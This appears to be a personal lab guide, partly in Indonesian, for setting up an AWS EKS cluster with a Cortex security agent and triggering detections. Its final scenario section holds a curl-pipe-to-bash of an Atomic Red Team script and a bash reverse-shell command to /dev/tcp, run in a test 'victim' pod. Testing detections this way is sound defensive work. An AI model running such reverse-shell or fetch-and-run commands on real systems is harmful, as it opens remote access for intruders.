# How To Setup in AWS

## 1. Install AWS Configure
```bash
#Masuk wsl
wsl

sudo ./aws/install

##Balik ke default directory
cd ~ 

curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"

unzip awscliv2.zip

sudo ./aws/install

aws --version

#confirm cek identity
aws sts get-caller-identity
```


## 2. Download kubectl

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

chmod +x kubectl

sudo mv kubectl /usr/local/bin/

kubectl version --client

```


## 3. Download EKSCTL

```bash

curl --silent --location "https://github.com/weaveworks/eksctl/releases/latest/download/eksctl_Linux_amd64.tar.gz" | tar xz -C /tmp

sudo mv /tmp/eksctl /usr/local/bin

eksctl version
```


## 4. Bikin cluster
```bash

#Kubernetes harus versi 1.30(gaobleh latest) dan pake image amazonlinux2 karna pake ubuntu terbaru gakbisa

eksctl create cluster   --name cortex-demo-cluster   --region ap-southeast-1   --nodegroup-name standard-nodes   --node-type c7i-flex.large   --nodes 1   --version 1.30   --node-ami-family AmazonLinux2


kubectl get nodes
```


## 5. Create agent installation buat kubernetes di Cortex

Inventory -> Endpoints -> Installation -> Nanti akan dapet yaml file

![[Pasted image 20260423104914.png]]



## 6. Install agent di kubernetes kubectl
Pindahkan file yaml ke wsl dulu
```bash
 kubectl apply -f kube-eks.yaml
 
 kubectl get pods -A
```

```
kubectl run demo-victim-dua --image=ubuntu --restart=Never -it -- bash
All commands and output from this session will be recorded in container logs, including credentials and sensitive information passed through the command prompt.
If you don't see a command prompt, try pressing enter.
root@demo-victim-dua:/# 
root@demo-victim-dua:/# pod default/demo-victim-dua terminated (Error)
```



# How To Access

```
wsl
cd ~

kubectl get pods -A


```


# Scenario
### Fileless Execution (Living off the Land)

curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo.sh | bash
![[Pasted image 20260421130935.png]]



kubectl run demo-victim-dua --image=ubuntu --restart=Never -it -- bash

bash -i >& /dev/tcp/8.8.8.8/53 0>&1

sudo apt update

sudo apt install curl -y